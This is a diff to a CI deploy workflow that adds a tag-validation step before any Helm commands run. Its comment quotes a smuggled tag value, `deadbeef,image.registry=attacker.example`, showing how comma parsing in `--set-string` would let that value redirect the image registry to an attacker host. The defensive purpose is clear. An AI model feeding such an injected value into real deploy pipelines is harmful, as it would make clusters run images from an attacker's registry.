@@ -131,6 +131,22 @@ jobs:
       #
       # Everything below is here because the decision it encodes is the
       # deliverable, and burying it in a runbook would make it prose.
+      # BEFORE ANY HELM COMMAND SEES IT. `--set-string image.tag="$TAG"` is not
+      # one assignment: Helm parses the value with `strvals`, where a comma
+      # separates assignments — so a dispatch of
+      # `deadbeef,image.registry=attacker.example` sets a valid `image.tag`
+      # AND overrides the registry, for the canary and the promotion alike.
+      # The chart's own validation passes, because by then the tag really is
+      # `deadbeef` and the injected key rode in beside it.
+      #
+      # The rule is `commerce.tag`'s, so the two cannot disagree, and it is
+      # tested — a regex inline here would be the one part of this file nothing
+      # could exercise.
+      - name: The tag has to be a tag
+        run: python deploy/canary/canary.py validate-tag --value "$TAG"
+        env:
+          TAG: ${{ inputs.tag }}
+
       - name: The first rung has a price, and it is paid before anything rolls
         run: |
           set -euo pipefail
